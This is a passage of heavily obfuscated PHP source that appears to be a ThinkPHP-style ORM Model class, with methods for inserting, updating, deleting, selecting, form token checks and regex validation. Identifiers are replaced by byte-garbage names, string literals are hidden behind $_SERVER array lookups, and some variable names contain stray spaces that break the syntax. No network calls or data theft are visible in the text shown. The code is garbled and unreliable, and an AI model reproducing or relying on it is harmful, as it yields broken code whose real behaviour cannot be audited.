1; } unset($Ë»˜”‰Ö); return parent::resetData($ˆ÷Û“Üè); } public function moveBottom($ŠäÑŸ¸´) { $éæ³›­İ =& $_SERVER[¬ÏÕ§Áú]; $’ÃÖ…Ğ€ = $this->getSort($éæ³›­İ[347]) + 1; return parent::update($ŠäÑŸ¸´, array($éæ³›­İ[2061] => $’ÃÖ…Ğ€)); } public function resetSort($ñ£‡ÁË¬) { $ŸÖÔ»‰ =& $_SERVER[¬ÏÕ§Áú]; $œ£¿¹Î… = array(); $ñ£‡ÁË¬ = is_array($ñ£‡ÁË¬) ? $ñ£‡ÁË¬ : array(); for ($¯ÎÊŞµÜ = 0; $¯ÎÊŞµÜ < count($ñ£‡ÁË¬); $¯ÎÊŞµÜ++) { $œ£¿¹Î…[$ñ£‡ÁË¬[$¯ÎÊŞµÜ] . $ŸÖÔ»‰[12]] = $¯ÎÊŞµÜ + 1; } $µ‡¢ò†ë = parent::listData(); foreach ($µ‡¢ò†ë as &$àêú¡·©) { $×ß¦šï• = $œ£¿¹Î…[$àêú¡·©[$ŸÖÔ»‰[492]]]; $àêú¡·©[$ŸÖÔ»‰[2061]] = $×ß¦šï• ? $×ß¦šï• : $àêú¡·©[$ŸÖÔ»‰[2061]]; } unset($àêú¡·©); return parent::resetData($µ‡¢ò†ë); } private function getSort($†¡‡³½) { $ê“Õåô =& $_SERVER[¬ÏÕ§Áú]; $÷‚‘Ôì¿ = parent::listData(); $áË“ì¹ = array_to_keyvalue($÷‚‘Ôì¿, $ê“Õåô[12], $ê“Õåô[2061]); if (!$áË“ì¹) { $áË“ì¹ = array(0); } $ŞËØ¬Ñ­ = $†¡‡³½ == $ê“Õåô[347] ? max($áË“ì¹) : min($áË“ì¹); return intval($ŞËØ¬Ñ­); } } goto Cš–´œ‘âÔ; d•ÑÃåÃ¬µ: define($_SERVER[¬ÏÕ§Áú][331], 0); define($_SERVER[¬ÏÕ§Áú][332], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\x62\x6c\x65", "\x6f\x72\144\145\x72", "\x61\154\x69\x61\x73", "\x68\x61\x76\x69\x6e\147", "\x67\x72\157\165\160", "\154\157\143\x6b", "\x64\151\163\x74\151\x6e\143\164", "\141\165\x74\157", "\146\x69\154\164\145\162", "\166\x61\154\151\144\141\164\x65", "\162\x65\x73\165\154\164", "\x62\x69\156\x64", "\164\x6f\x6b\x65\x6e"); public function __construct($ê³ë¨Âô = '', $Ç¿®Ò†ô = '', $óîÇ„å½ = '') { $àæµÂÔ =& $_SERVER[¬ÏÕ§Áú]; $this->_initialize(); if (!empty($ê³ë¨Âô)) { if (strpos($ê³ë¨Âô, $àæµÂÔ[10])) { list($this->dbName, $this->name) = explode($àæµÂÔ[10], $ê³ë¨Âô); } else { $this->name = $ê³ë¨Âô; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($Ç¿®Ò†ô)) { $this->tablePrefix = $àæµÂÔ[12]; } elseif ($àæµÂÔ[12] != $Ç¿®Ò†ô) { $this->tablePrefix = $Ç¿®Ò†ô; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($àæµÂÔ[333]); } $this->db(0, empty($this->connection) ? $óîÇ„å½ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $é„©ü•® =& $_SERVER[¬ÏÕ§Áú]; if (empty($this->fields)) { if (think_config($é„©ü•®[334])) { $ë›†ÈãÙ = $this->dbName ? $this->dbName : think_config($é„©ü•®[335]); $ÜÃ·‰šü = think_var_cache($é„©ü•®[336] . strtolower(get_path_this($ë›†ÈãÙ) . $é„©ü•®[10] . $this->name)); if ($ÜÃ·‰šü) { $Ü£öû›… = think_config($é„©ü•®[337]); if (empty($Ü£öû›…) || $ÜÃ·‰šü[$é„©ü•®[338]] == $Ü£öû›…) { $this->fields = $ÜÃ·‰šü; return; } } } $this->flush(); } } public function flush() { $Éˆµ÷çç =& $_SERVER[¬ÏÕ§Áú]; $this->db->setModel($this->name); $È•·šİ = $this->db->getFields($this->getTableName()); if (!$È•·šİ) { return !1; } $this->fields = array_keys($È•·šİ); $this->fields[$Éˆµ÷çç[339]] = !1; foreach ($È•·šİ as $û¦Öâé => $··Ú¹ı‚) { $³‘€Œ›[$û¦Öâé] = $··Ú¹ı‚[$Éˆµ÷çç[33]]; if ($··Ú¹ı‚[$Éˆµ÷çç[39]]) { $this->fields[$Éˆµ÷çç[340]] = $û¦Öâé; if ($··Ú¹ı‚[$Éˆµ÷çç[42]]) { $this->fields[$Éˆµ÷çç[339]] = !0; } } } $this->fields[$Éˆµ÷çç[341]] = $³‘€Œ›; if (think_config($Éˆµ÷çç[337])) { $this->fields[$Éˆµ÷çç[338]] = think_config($Éˆµ÷çç[337]); } if (think_config($Éˆµ÷çç[334])) { $ôªã†‚§ = $this->dbName ? $this->dbName : think_config($Éˆµ÷çç[335]); think_var_cache($Éˆµ÷çç[336] . strtolower(get_path_this($ôªã†‚§) . $Éˆµ÷çç[10] . $this->name), $this->fields); } } public function switchModel($îâŞĞ’, $ßŸÇïÔŠ = array()) { $ØéñĞ =& $_SERVER[¬ÏÕ§Áú]; $Ùıú…Ë = ucwords(strtolower($îâŞĞ’)) . $ØéñĞ[342]; if (!class_exists($Ùıú…Ë)) { think_exception($Ùıú…Ë . think_lang($ØéñĞ[343])); } $this->_extModel = new $Ùıú…Ë($this->name); if (!empty($ßŸÇïÔŠ)) { foreach ($ßŸÇïÔŠ as $äæŒâ£) { $this->_extModel->setProperty($äæŒâ£, $this->{$äæŒâ£}); } } return $this->_extModel; } public function __set($°Ÿ Èï, $©¢Ğ˜Ò‰) { $this->data[$°Ÿ Èï] = $©¢Ğ˜Ò‰; } public function __get($¥šõàèÆ) { return isset($this->data[$¥šõàèÆ]) ? $this->data[$¥šõàèÆ] : null; } public function __isset($ªÔÖò«İ) { return isset($this->data[$ªÔÖò«İ]); } public function __unset($ Ì´õ’Û) { unset($this->data[$ Ì´õ’Û]); } public function __call($ÂÅ‹â®ğ, $õêıá¿•) { $Ü¸È£Å® =& $_SERVER[¬ÏÕ§Áú]; if (in_array(strtolower($ÂÅ‹â®ğ), $this->methods, !0)) { $this->options[strtolower($ÂÅ‹â®ğ)] = $õêıá¿•[0]; return $this; } elseif (in_array(strtolower($ÂÅ‹â®ğ), array($Ü¸È£Å®[344], $Ü¸È£Å®[345], $Ü¸È£Å®[346], $Ü¸È£Å®[347], $Ü¸È£Å®[348]), !0)) { $¾û‡Î = isset($õêıá¿•[0]) ? $õêıá¿•[0] : $Ü¸È£Å®[233]; $¾û‡Î = $this->db->parseKey($¾û‡Î); return $this->getField(strtoupper($ÂÅ‹â®ğ) . $Ü¸È£Å®[349] . $¾û‡Î . $Ü¸È£Å®[350] . $ÂÅ‹â®ğ, $Ü¸È£Å®[344]); } elseif (strtolower(substr($ÂÅ‹â®ğ, 0, 5)) == $Ü¸È£Å®[351]) { $¾û‡Î = think_parse_name(substr($ÂÅ‹â®ğ, 5)); $ƒ‹Â¡«[$¾û‡Î] = $õêıá¿•[0]; return $this->where($ƒ‹Â¡«)->find(); } elseif (strtolower(substr($ÂÅ‹â®ğ, 0, 10)) == $Ü¸È£Å®[352]) { $ÏÉ°°õ = think_parse_name(substr($ÂÅ‹â®ğ, 10)); $ƒ‹Â¡«[$ÏÉ°°õ] = $õêıá¿•[0]; return $this->where($ƒ‹Â¡«)->getField($õêıá¿•[1]); } elseif (isset($this->_scope[$ÂÅ‹â®ğ])) { return $this->scope($ÂÅ‹â®ğ, $õêıá¿•[0]); } elseif (method_exists($this, $ÂÅ‹â®ğ)) { array_unshift($õêıá¿•, $ÂÅ‹â®ğ); return call_user_func_array(array($this, $Ü¸È£Å®[353]), $õêıá¿•); } else { return call_user_func_array(array(parent, $ÂÅ‹â®ğ), $õêıá¿•); } } protected function call() { $íØÛ„Òæ =& $_SERVER[¬ÏÕ§Áú]; $ç®ùÖå = func_get_args(); $˜„¸’ÖÓ = array_shift($ç®ùÖå); $£ÂœóÅó = $˜„¸’ÖÓ; if (is_array($˜„¸’ÖÓ)) { $£ÂœóÅó = $˜„¸’ÖÓ[1]; $˜„¸’ÖÓ = $˜„¸’ÖÓ[0]; } $Ú¤ñÖÄı = count($ç®ùÖå) - 1; if (isset($ç®ùÖå[$Ú¤ñÖÄı]) && $ç®ùÖå[$Ú¤ñÖÄı] === $˜„¸’ÖÓ) { think_exception(__CLASS__ . $íØÛ„Òæ[4] . $˜„¸’ÖÓ . think_lang($íØÛ„Òæ[354])); return; } $ç®ùÖå[] = $˜„¸’ÖÓ; if (method_exists($this, $íØÛ„Òæ[355])) { $Ã½Àö¯ = call_user_func_array(array($this, $íØÛ„Òæ[356]), array($£ÂœóÅó, $ç®ùÖå)); if (!is_null($Ã½Àö¯) && $Ã½Àö¯ !== !1) { return $Ã½Àö¯; } } $ÜñîÄ‡Å = call_user_func_array(array($this, $˜„¸’ÖÓ), $ç®ùÖå); if (method_exists($this, $íØÛ„Òæ[357])) { $Ã½Àö¯ = call_user_func_array(array($this, $íØÛ„Òæ[358]), array($£ÂœóÅó, $ç®ùÖå, $ÜñîÄ‡Å)); if ($Ã½Àö¯) { return $Ã½Àö¯; } } return $ÜñîÄ‡Å; } protected function _initialize() { } protected function _facade($€§Ã‡ş) { $úß¨ÄÖ‰ =& $_SERVER[¬ÏÕ§Áú]; if (!empty($this->fields)) { foreach ($€§Ã‡ş as $îĞ¨Ÿ™ğ => $™¯ö°¢¸) { if (is_array($this->fields) && !in_array($îĞ¨Ÿ™ğ, $this->fields, !0)) { unset($€§Ã‡ş[$îĞ¨Ÿ™ğ]); } elseif (is_scalar($™¯ö°¢¸)) { $this->_parseType($€§Ã‡ş, $îĞ¨Ÿ™ğ); } } } if (!empty($this->options[$úß¨ÄÖ‰[359]])) { $€§Ã‡ş = array_map($this->options[$úß¨ÄÖ‰[359]], $€§Ã‡ş); unset($this->options[$úß¨ÄÖ‰[359]]); } $this->_beforeWrite($€§Ã‡ş); return $€§Ã‡ş; } protected function _beforeWrite(&$ù‚ìûò) { } public function add($Ø¿İó‹ = '', $šõÆºÖ = array(), $ß„ËØ¶¾ = false) { if (empty($Ø¿İó‹)) { if (!empty($this->data)) { $Ø¿İó‹ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[¬ÏÕ§Áú][360]); return !1; } } $šõÆºÖ = $this->_parseOptions($šõÆºÖ); $Ø¿İó‹ = $this->_facade($Ø¿İó‹); if (!1 === $this->_beforeInsert($Ø¿İó‹, $šõÆºÖ)) { return !1; } $æà—ßÏÚ = $this->db->insert($Ø¿İó‹, $šõÆºÖ, $ß„ËØ¶¾); if (!1 !== $æà—ßÏÚ) { $æƒÌûâ¨ = $this->getLastInsID(); if ($æƒÌûâ¨) { $Ø¿İó‹[$this->getPk()] = $æƒÌûâ¨; $this->_after_insert($Ø¿İó‹, $šõÆºÖ); return $æƒÌûâ¨; } $this->_after_insert($Ø¿İó‹, $šõÆºÖ); } return $æà—ßÏÚ; } protected function _beforeInsert(&$†‹ÓóË¦, $šÀ¬±â¿) { } protected function _after_insert($¹ŒŠ™ÉÇ, $Í‹Ší–) { } public function addAll($ëÈì³À, $¢Ú¥à‘Ì = array(), $£ıˆ§à = false) { $ç®ª¨ô  =& $_SERVER[¬ÏÕ§Áú]; if (empty($ëÈì³À)) { $this->error = think_lang($ç®ª¨ô [360]); return !1; } $¢Ú¥à‘Ì = $this->_parseOptions($¢Ú¥à‘Ì); foreach ($ëÈì³À as $Ú±ŸÈÆ€ => $ëµâÀ«±) { $ëÈì³À[$Ú±ŸÈÆ€] = $this->_facade($ëµâÀ«±); } if (method_exists($this->db, $ç®ª¨ô [361])) { $¯áº„ï = $this->db->insertAll($ëÈì³À, $¢Ú¥à‘Ì, $£ıˆ§à); } else { $this->startTrans(); foreach ($ëÈì³À as $Ú±ŸÈÆ€ => $ëµâÀ«±) { $¯áº„ï = $this->db->insert($ëµâÀ«±, $¢Ú¥à‘Ì, $£ıˆ§à); } $this->commit(); } if (!1 !== $¯áº„ï) { $™úºÃù = $this->getLastInsID(); if ($™úºÃù) { return $™úºÃù; } } return $¯áº„ï; } public function selectAdd($ÙÛ“¹€¥ = '', $±ëàĞ€² = '', $ìÒ›˜»È = array()) { $¿ÏÆñó› =& $_SERVER[¬ÏÕ§Áú]; $ìÒ›˜»È = $this->_parseOptions($ìÒ›˜»È); if (!1 === ($ò£Ï†Ÿ€ = $this->db->selectInsert($ÙÛ“¹€¥ ? $ÙÛ“¹€¥ : $ìÒ›˜»È[$¿ÏÆñó›[362]], $±ëàĞ€² ? $±ëàĞ€² : $this->getTableName(), $ìÒ›˜»È))) { $this->error = think_lang($¿ÏÆñó›[363]); return !1; } else { return $ò£Ï†Ÿ€; } } public function save($âœò««“ = '', $ø˜…šÓ = array()) { $Ìô“×åõ =& $_SERVER[¬ÏÕ§Áú]; if (empty($âœò««“)) { if (!empty($this->data)) { $âœò««“ = $this->data; $this->data = array(); } else { $this->error = think_lang($Ìô“×åõ[360]); return !1; } } $âœò««“ = $this->_facade($âœò««“); $ø˜…šÓ = $this->_parseOptions($ø˜…šÓ); $õéœÃ = $this->getPk(); if (!isset($ø˜…šÓ[$Ìô“×åõ[364]])) { if (isset($âœò««“[$õéœÃ])) { $òÉçí˜‹[$õéœÃ] = $âœò««“[$õéœÃ]; $ø˜…šÓ[$Ìô“×åõ[364]] = $òÉçí˜‹; unset($âœò««“[$õéœÃ]); } else { $this->error = think_lang($Ìô“×åõ[363]); return !1; } } if (is_array($ø˜…šÓ[$Ìô“×åõ[364]]) && isset($ø˜…šÓ[$Ìô“×åõ[364]][$õéœÃ])) { $é¸÷ìÈ = $ø˜…šÓ[$Ìô“×åõ[364]][$õéœÃ]; } if (!1 === $this->_beforeUpdate($âœò««“, $ø˜…šÓ)) { return !1; } $º‹Û¡†½ = $this->db->update($âœò««“, $ø˜…šÓ); if (!1 !== $º‹Û¡†½) { if (isset($é¸÷ìÈ)) { $âœò««“[$õéœÃ] = $é¸÷ìÈ; } $this->_afterUpdate($âœò««“, $ø˜…šÓ); } return $º‹Û¡†½; } protected function _beforeUpdate(&$Çàˆñ, $Öµúé”) { } protected function _afterUpdate($ÖœÆ‚á, $ø¢ÎÈ“•) { } public function delete($¡œ˜ş‚û = array()) { $ÒóªÌ”û =& $_SERVER[¬ÏÕ§Áú]; if (empty($¡œ˜ş‚û) && empty($this->options[$ÒóªÌ”û[364]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $š€›ëä– = $this->getPk(); if (is_numeric($¡œ˜ş‚û) || is_string($¡œ˜ş‚û)) { if (strpos($¡œ˜ş‚û, $ÒóªÌ”û[50])) { $ÚØÏßÍù[$š€›ëä–] = array($ÒóªÌ”û[365], $¡œ˜ş‚û); } else { $ÚØÏßÍù[$š€›ëä–] = $¡œ˜ş‚û; } $this->options[$ÒóªÌ”û[364]] = $ÚØÏßÍù; } $¡œ˜ş‚û = $this->_parseOptions(); if (is_array($¡œ˜ş‚û[$ÒóªÌ”û[364]]) && isset($¡œ˜ş‚û[$ÒóªÌ”û[364]][$š€›ëä–])) { $œó÷é½Ê = $¡œ˜ş‚û[$ÒóªÌ”û[364]][$š€›ëä–]; } $¨æí÷ü = $this->db->delete($¡œ˜ş‚û); if (!1 !== $¨æí÷ü) { $Ò­îúÂú = array(); if (isset($œó÷é½Ê)) { $Ò­îúÂú[$š€›ëä–] = $œó÷é½Ê; } $this->_after_delete($Ò­îúÂú, $¡œ˜ş‚û); } return $¨æí÷ü; } protected function _after_delete($ÍöÀÁ­Ã, $›ß¦ïÌ) { } public function select($ÅÜ¼®óØ = array()) { $Ñô¹ºÍ =& $_SERVER[¬ÏÕ§Áú]; if (is_string($ÅÜ¼®óØ) || is_numeric($ÅÜ¼®óØ)) { $´Åê±¬º = $this->getPk(); if (strpos($ÅÜ¼®óØ, $Ñô¹ºÍ[50])) { $ˆ¡Š‘¹Ÿ[$´Åê±¬º] = array($Ñô¹ºÍ[365], $ÅÜ¼®óØ); } else { $ˆ¡Š‘¹Ÿ[$´Åê±¬º] = $ÅÜ¼®óØ; } $this->options[$Ñô¹ºÍ[364]] = $ˆ¡Š‘¹Ÿ; } elseif (!1 === $ÅÜ¼®óØ) { $ÅÜ¼®óØ = $this->_parseOptions(); return $Ñô¹ºÍ[366] . $this->db->buildSelectSql($ÅÜ¼®óØ) . $Ñô¹ºÍ[367]; } $ÅÜ¼®óØ = $this->_parseOptions(); $÷»ü´ª = $this->db->select($ÅÜ¼®óØ); if (!1 === $÷»ü´ª) { return !1; } if (empty($÷»ü´ª)) { return null; } $this->_afterSelect($÷»ü´ª, $ÅÜ¼®óØ); return $÷»ü´ª; } protected function _afterSelect(&$³ç±ıøâ, $Ü”†ù•–) { } public function buildSql($·Êè Û­ = array()) { $ª¦¶Øƒ¦ =& $_SERVER[¬ÏÕ§Áú]; $·Êè Û­ = $this->_parseOptions($·Êè Û­); return $ª¦¶Øƒ¦[366] . $this->db->buildSelectSql($·Êè Û­) . $ª¦¶Øƒ¦[367]; } public function optionsValue($ò÷“ñ = null) { if (is_null($ò÷“ñ)) { return $this->options; } elseif (is_array($ò÷“ñ)) { $this->options = array_merge($this->options, $ò÷“ñ); } } protected function _parseOptions($´ö…³¬‘ = array()) { $¸Ù™´ë =& $_SERVER[¬ÏÕ§Áú]; if (is_array($´ö…³¬‘)) { $´ö…³¬‘ = array_merge($this->options, $´ö…³¬‘); } $this->options = array(); if (!isset($´ö…³¬‘[$¸Ù™´ë[368]])) { $´ö…³¬‘[$¸Ù™´ë[368]] = $this->getTableName(); $î‚ù¦…à = $this->fields; } else { $î‚ù¦…à = $this->getDbFields(); } if (!empty($´ö…³¬‘[$¸Ù™´ë[369]])) { $´ö…³¬‘[$¸Ù™´ë[368]] .= $¸Ù™´ë[53] . $´ö…³¬‘[$¸Ù™´ë[369]]; } $´ö…³¬‘[$¸Ù™´ë[370]] = $this->name; if (isset($´ö…³¬‘[$¸Ù™´ë[364]]) && is_array($´ö…³¬‘[$¸Ù™´ë[364]]) && !empty($î‚ù¦…à) && !isset($´ö…³¬‘[$¸Ù™´ë[371]]) && !isset($´ö…³¬‘[$¸Ù™´ë[368]])) { foreach ($´ö…³¬‘[$¸Ù™´ë[364]] as $µ®³’‚Ü => $èÛ…ğ—Ç) { $µ®³’‚Ü = trim($µ®³’‚Ü); if (in_array($µ®³’‚Ü, $î‚ù¦…à, !0)) { if (is_scalar($èÛ…ğ—Ç)) { $this->_parseType($´ö…³¬‘[$¸Ù™´ë[364]], $µ®³’‚Ü); } } elseif (!is_numeric($µ®³’‚Ü) && $¸Ù™´ë[11] != substr($µ®³’‚Ü, 0, 1) && !1 === strpos($µ®³’‚Ü, $¸Ù™´ë[10]) && !1 === strpos($µ®³’‚Ü, $¸Ù™´ë[349]) && !1 === strpos($µ®³’‚Ü, $¸Ù™´ë[225]) && !1 === strpos($µ®³’‚Ü, $¸Ù™´ë[297])) { unset($´ö…³¬‘[$¸Ù™´ë[364]][$µ®³’‚Ü]); } } } $this->_options_filter($´ö…³¬‘); return $´ö…³¬‘; } protected function _options_filter(&$¾ĞéÊ) { } protected function _parseType(&$ «ı«‹, $•Ÿà•ıÈ) { $ºêĞªïÛ =& $_SERVER[¬ÏÕ§Áú]; if (empty($this->options[$ºêĞªïÛ[372]][$ºêĞªïÛ[4] . $•Ÿà•ıÈ])) { $ºù²”ëæ = strtolower($this->fields[$ºêĞªïÛ[341]][$•Ÿà•ıÈ]); if (!1 !== strpos($ºù²”ëæ, $ºêĞªïÛ[373])) { } elseif (!1 === strpos($ºù²”ëæ, $ºêĞªïÛ[374]) && !1 !== strpos($ºù²”ëæ, $ºêĞªïÛ[375])) { $ «ı«‹[$•Ÿà•ıÈ] = intval($ «ı«‹[$•Ÿà•ıÈ]); } elseif (!1 !== strpos($ºù²”ëæ, $ºêĞªïÛ[376]) || !1 !== strpos($ºù²”ëæ, $ºêĞªïÛ[377])) { $ «ı«‹[$•Ÿà•ıÈ] = floatval($ «ı«‹[$•Ÿà•ıÈ]); } elseif (!1 !== strpos($ºù²”ëæ, $ºêĞªïÛ[378])) { $ «ı«‹[$•Ÿà•ıÈ] = (bool) $ «ı«‹[$•Ÿà•ıÈ]; } } } public function find($ƒ÷«Öãş = array()) { $ÀöŸÌİ• =& $_SERVER[¬ÏÕ§Áú]; if (is_numeric($ƒ÷«Öãş) || is_string($ƒ÷«Öãş)) { $ÇÀ¸¡Ü[$this->getPk()] = intval($ƒ÷«Öãş); $this->options[$ÀöŸÌİ•[364]] = $ÇÀ¸¡Ü; } $this->options[$ÀöŸÌİ•[379]] = 1; $ƒ÷«Öãş = $this->_parseOptions(); $Æ©®÷Ö = $this->db->select($ƒ÷«Öãş); if (!1 === $Æ©®÷Ö) { return !1; } if (empty($Æ©®÷Ö)) { return null; } $ï“¤¦ƒ = $Æ©®÷Ö[0]; $this->_afterFind($ï“¤¦ƒ, $ƒ÷«Öãş); return $ï“¤¦ƒ; } protected function _afterFind(&$Î‰®»©—, $Â±¬Ç¦²) { } protected function returnResult($Ø¾¨ÓÄÇ, $¼Ö´ì…à = '') { $Š´âºÀ˜ =& $_SERVER[¬ÏÕ§Áú]; if ($¼Ö´ì…à) { if (is_callable($¼Ö´ì…à)) { return call_user_func($¼Ö´ì…à, $Ø¾¨ÓÄÇ); } switch (strtolower($¼Ö´ì…à)) { case $Š´âºÀ˜[380]: return json_encode($Ø¾¨ÓÄÇ); case $Š´âºÀ˜[381]: return xml_encode($Ø¾¨ÓÄÇ); } } return $Ø¾¨ÓÄÇ; } public function parseFieldsMap($÷ı–Í¡ş, $ÛòƒáÁÔ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $ò»®Ú’Ã => $Ú“Àº) { if ($ÛòƒáÁÔ == 1) { if (isset($÷ı–Í¡ş[$Ú“Àº])) { $÷ı–Í¡ş[$ò»®Ú’Ã] = $÷ı–Í¡ş[$Ú“Àº]; unset($÷ı–Í¡ş[$Ú“Àº]); } } else { if (isset($÷ı–Í¡ş[$ò»®Ú’Ã])) { $÷ı–Í¡ş[$Ú“Àº] = $÷ı–Í¡ş[$ò»®Ú’Ã]; unset($÷ı–Í¡ş[$ò»®Ú’Ã]); } } } } return $÷ı–Í¡ş; } public function setField($ÖšÏÃÖÇ, $Ûâ‚ÓÑú = '') { if (is_array($ÖšÏÃÖÇ)) { $ÓñÒ¥Á• = $ÖšÏÃÖÇ; } else { $ÓñÒ¥Á•[$ÖšÏÃÖÇ] = $Ûâ‚ÓÑú; } return $this->save($ÓñÒ¥Á•); } public function setAdd($ø¬ı†î¸, $ú²«á¿ß = 1) { $é¸³õƒõ =& $_SERVER[¬ÏÕ§Áú]; $Å¥²€øŸ = $ø¬ı†î¸ . $é¸³õƒõ[382] . $ú²«á¿ß; if ($ú²«á¿ß < 0) { $Å¥²€øŸ = $ø¬ı†î¸ . $ú²«á¿ß; } return $this->setField($ø¬ı†î¸, array($é¸³õƒõ[383], $Å¥²€øŸ)); } public function getField($ä­±µ…é, $½åæâºã = null) { $•ŞåÚ =& $_SERVER[¬ÏÕ§Áú]; $ÙŠäÁò[$•ŞåÚ[362]] = $ä­±µ…é; $ÙŠäÁò = $this->_parseOptions($ÙŠäÁò); $ä­±µ…é = trim($ä­±µ…é); if (strpos($ä­±µ…é, $•ŞåÚ[50])) { if (!isset($ÙŠäÁò[$•ŞåÚ[379]])) { $ÙŠäÁò[$•ŞåÚ[379]] = is_numeric($½åæâºã) ? $½åæâºã : $•ŞåÚ[12]; } $Ã‚¢òø× = $this->db->select($ÙŠäÁò); if (!empty($Ã‚¢òø×)) { $¯ÔúïëÉ = explode($•ŞåÚ[50], $ä­±µ…é); $ä­±µ…é = array_keys($Ã‚¢òø×[0]); $­Í‡ŠËŞ = array_shift($ä­±µ…é); $“²²·æ = array_shift($ä­±µ…é); $„ßÆèÈˆ = array(); $’‹•íƒß = count($¯ÔúïëÉ); foreach ($Ã‚¢òø× as $Ø¥Şİâ—) { $Ä¾ŸÊ†õ = $Ø¥Şİâ—[$­Í‡ŠËŞ]; if (2 == $’‹•íƒß) { $„ßÆèÈˆ[$Ä¾ŸÊ†õ] = $Ø¥Şİâ—[$“²²·æ]; } else { $„ßÆèÈˆ[$Ä¾ŸÊ†õ] = is_string($½åæâºã) ? implode($½åæâºã, $Ø¥Şİâ—) : $Ø¥Şİâ—; } } return $„ßÆèÈˆ; } } else { if (!0 !== $½åæâºã) { $ÙŠäÁò[$•ŞåÚ[379]] = is_numeric($½åæâºã) ? $½åæâºã : 1; } if ($½åæâºã === $•ŞåÚ[344]) { unset($ÙŠäÁò[$•ŞåÚ[379]]); } $Ø¥Şİâ— = $this->db->select($ÙŠäÁò); if (!empty($Ø¥Şİâ—)) { if ($½åæâºã === $•ŞåÚ[344]) { return reset($Ø¥Şİâ—[0]); } if (!0 !== $½åæâºã && 1 == $ÙŠäÁò[$•ŞåÚ[379]]) { return reset($Ø¥Şİâ—[0]); } foreach ($Ø¥Şİâ— as $î€ƒ¼ÀÕ) { $¦³ğÇ…Ì[] = $î€ƒ¼ÀÕ[$ä­±µ…é]; } return $¦³ğÇ…Ì; } } return null; } public function create($¼üìûâ’ = '', $ÌŠÌ†† = '') { $µÄŸ££ =& $_SERVER[¬ÏÕ§Áú]; if (empty($¼üìûâ’)) { $¼üìûâ’ = $_POST; } elseif (is_object($¼üìûâ’)) { $¼üìûâ’ = get_object_vars($¼üìûâ’); } if (empty($¼üìûâ’) || !is_array($¼üìûâ’)) { $this->error = think_lang($µÄŸ££[360]); return !1; } $¼üìûâ’ = $this->parseFieldsMap($¼üìûâ’, 0); $ÌŠÌ†† = $ÌŠÌ†† ? $ÌŠÌ†† : (!empty($¼üìûâ’[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$µÄŸ££[362]])) { $Ùñ™óÉÇ = $this->options[$µÄŸ££[362]]; unset($this->options[$µÄŸ££[362]]); } elseif ($ÌŠÌ†† == THINK_MODEL_INSERT && isset($this->insertFields)) { $Ùñ™óÉÇ = $this->insertFields; } elseif ($ÌŠÌ†† == THINK_MODEL_UPDATE && isset($this->updateFields)) { $Ùñ™óÉÇ = $this->updateFields; } if (isset($Ùñ™óÉÇ)) { if (is_string($Ùñ™óÉÇ)) { $Ùñ™óÉÇ = explode($µÄŸ££[50], $Ùñ™óÉÇ); } if (think_config($µÄŸ££[384])) { $Ùñ™óÉÇ[] = think_config($µÄŸ££[385]); } foreach ($¼üìûâ’ as $”ğÒİıà => $½÷ÉÑÃè) { if (!in_array($”ğÒİıà, $Ùñ™óÉÇ)) { unset($¼üìûâ’[$”ğÒİıà]); } } } if (!$this->autoValidation($¼üìûâ’, $ÌŠÌ††)) { return !1; } if (!$this->autoCheckToken($¼üìûâ’)) { $this->error = think_lang($µÄŸ££[386]); return !1; } if ($this->autoCheckFields) { $Ùñ™óÉÇ = $this->getDbFields(); foreach ($¼üìûâ’ as $”ğÒİıà => $½÷ÉÑÃè) { if (!in_array($”ğÒİıà, $Ùñ™óÉÇ)) { unset($¼üìûâ’[$”ğÒİıà]); } elseif (MAGIC_QUOTES_GPC && is_string($½÷ÉÑÃè)) { $¼üìûâ’[$”ğÒİıà] = stripslashes($½÷ÉÑÃè); } } } $this->autoOperation($¼üìûâ’, $ÌŠÌ††); $this->data = $¼üìûâ’; return $¼üìûâ’; } public function autoCheckToken($ì¼µŠã—) { $á‚ ®ª– =& $_SERVER[¬ÏÕ§Áú]; if (isset($this->options[$á‚ ®ª–[387]]) && !$this->options[$á‚ ®ª–[387]]) { return !0; } if (think_config($á‚ ®ª–[384])) { $²œËñº = think_config($á‚ ®ª–[385]); if (!isset($ì¼µŠã—[$²œËñº]) || Session::get($²œËñº)) { return !1; } list($šØ²ù³Ó, $Éóª—ÕÒ) = explode($á‚ ®ª–[11], $ì¼µŠã—[$²œËñº]); if ($Éóª—ÕÒ && Session::get($²œËñº . $á‚ ®ª–[10] . $šØ²ù³Ó) === $Éóª—ÕÒ) { Session::remove($²œËñº . $á‚ ®ª–[10] . $šØ²ù³Ó); return !0; } if (think_config($á‚ ®ª–[388])) { Session::remove($²œËñº . $á‚ ®ª–[10] . $šØ²ù³Ó); } return !1; } return !0; } public function regex($ò‘«¾, $ğîê¢Æ) { $ÖÇÍ¸ƒ =& $_SERVER[¬ÏÕ§Áú]; $øŞöç³á = array($ÖÇÍ¸ƒ[389] => $ÖÇÍ¸ƒ[390], $ÖÇÍ¸ƒ[391] => $ÖÇÍ¸ƒ[392], $ÖÇÍ¸ƒ[393] => $ÖÇÍ¸ƒ[394], $ÖÇÍ¸ƒ[395] => $ÖÇÍ¸ƒ[396], $ÖÇÍ¸ƒ[397] => $ÖÇÍ¸ƒ[398], $ÖÇÍ¸ƒ[399] => $ÖÇÍ¸ƒ[400], $ÖÇÍ¸ƒ[401] => $ÖÇÍ¸ƒ[402], $ÖÇÍ¸ƒ[377] => $ÖÇÍ¸ƒ[403], $ÖÇÍ¸ƒ[404] => $ÖÇÍ¸ƒ[405]); if (isset($øŞöç³á[strtolower($ğîê¢Æ)])) { $ğîê¢Æ = $øŞöç³á[strtolower($ğîê¢Æ)]; } return preg_match($ğîê¢Æ, $ò‘«¾) === 1; } private function 